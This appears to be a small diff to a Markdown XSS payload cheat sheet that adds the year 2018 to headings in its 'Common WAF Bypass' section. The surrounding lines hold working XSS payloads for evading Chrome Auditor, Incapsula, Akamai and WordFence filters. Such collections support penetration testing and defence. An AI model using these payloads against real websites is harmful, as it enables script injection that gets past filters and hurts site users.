@@ -823,7 +823,7 @@ Works for CSP like `script-src self`
 
 ## Common WAF Bypass
 
-### Chrome Auditor - 9th august
+### Chrome Auditor - 9th august 2018
 
 ```javascript
 </script><svg><script>alert(1)-%26apos%3B
@@ -831,7 +831,7 @@ Works for CSP like `script-src self`
 
 Live example by @brutelogic - [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php?c1=</script><svg><script>alert(1)-%26apos%3B)
 
-### Incapsula WAF Bypass by [@Alra3ees](https://twitter.com/Alra3ees/status/971847839931338752)- 8th march
+### Incapsula WAF Bypass by [@Alra3ees](https://twitter.com/Alra3ees/status/971847839931338752)- 8th march 2018
 
 ```javascript
 anythinglr00</script><script>alert(document.domain)</script>uxldz
@@ -839,25 +839,26 @@ anythinglr00</script><script>alert(document.domain)</script>uxldz
 anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
 ```
 
-### Incapsula WAF Bypass by [@c0d3G33k](https://twitter.com/c0d3G33k) - 11th september
+### Incapsula WAF Bypass by [@c0d3G33k](https://twitter.com/c0d3G33k) - 11th september 2018
 
 ```javascript
 <object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
 ```
 
-### Akamai WAF Bypass by [@zseano](https://twitter.com/zseano) - 18th june
+
+### Akamai WAF Bypass by [@zseano](https://twitter.com/zseano) - 18th june 2018
 
 ```javascript
 ?"></script><base%20c%3D=href%3Dhttps:\mysite>
 ```
 
-### Akamai WAF Bypass by [@s0md3v](https://twitter.com/s0md3v/status/1056447131362324480) - 28th october
+### Akamai WAF Bypass by [@s0md3v](https://twitter.com/s0md3v/status/1056447131362324480) - 28th october 2018
 
 ```html
 <dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
 ```
 
-### WordFence WAF Bypass by [@brutelogic](https://twitter.com/brutelogic) - 12th september
+### WordFence WAF Bypass by [@brutelogic](https://twitter.com/brutelogic) - 12th september 2018
 
 ```javascript
 <a href=javas&#99;ript:alert(1)>
